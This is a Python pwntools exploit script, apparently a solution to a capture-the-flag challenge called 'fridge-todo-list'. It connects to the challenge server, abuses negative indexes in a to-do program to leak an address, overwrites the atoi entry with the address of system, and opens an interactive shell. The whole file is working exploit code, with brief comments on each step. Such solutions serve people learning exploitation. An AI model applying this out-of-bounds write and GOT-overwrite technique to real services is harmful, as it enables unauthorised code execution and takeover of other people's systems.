from pwn import *
# todos @ 0x203140

#p = process('./todo')
p = connect('fridge-todo-list.ctfcompetition.com', 1337)
p.sendlineafter('user: ', 'asd')

# Leak
p.sendlineafter('> ', '2')
p.sendlineafter('read? ', '-6')
p.recvuntil('Your TODO: ')
write_leak = p.recvuntil('\n').strip().ljust(8,'\x00')
write_leak = u64(write_leak)
leak = write_leak - 0x916
log.success('Leaked: '+hex(leak))

system_leak = leak + 0x940

# open -> -4
# Overwrite
p.sendlineafter('> ', '3')
p.sendlineafter('entry? ', '-4')
# Line below overwrites atoi with the PLT address of system.
# 8 'A's is needed to get to the right address
p.sendlineafter('TODO? ', 'A'*8 + p64(system_leak))
p.interactive()
